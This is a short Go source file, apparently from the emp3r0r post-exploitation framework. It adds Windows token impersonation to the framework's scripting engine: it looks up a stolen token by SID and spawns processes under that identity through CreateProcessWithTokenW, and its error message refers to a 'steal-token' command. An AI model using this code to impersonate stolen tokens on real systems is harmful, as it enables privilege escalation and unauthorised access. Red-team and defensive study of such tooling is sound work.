//go:build windows

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"golang.org/x/sys/windows"
)

func init() {
	// Register the Windows-specific process-creation hook so that
	// starlark's exec_cmd automatically uses CreateProcessWithTokenW
	// when a token is active (i.e. when ExecuteAsToken is on the stack).
	script.ExecWithToken = func(token uintptr, commandLine string) error {
		return priv.CreateProcessWithToken(windows.Handle(token), commandLine)
	}
}

// executeWithToken runs action under the impersonation context of the token
// identified by sid in priv.TokenMap. If sid is empty the action is called
// directly with token=0 (no impersonation).
//
// The token handle (as uintptr) is passed to action so that in-process
// consumers such as starlark's exec_cmd can spawn children under the
// impersonated identity via CreateProcessWithTokenW.
func executeWithToken(sid string, action func(token uintptr) error) error {
	if sid == "" {
		return action(0)
	}

	raw, ok := priv.TokenMap.Load(sid)
	if !ok {
		return fmt.Errorf("token not found for SID %q – steal a token first with steal-token", sid)
	}

	hToken, ok := raw.(windows.Handle)
	if !ok {
		return fmt.Errorf("invalid token handle type for SID %q", sid)
	}

	return priv.ExecuteAsToken(hToken, func() error {
		return action(uintptr(hToken))
	})
}
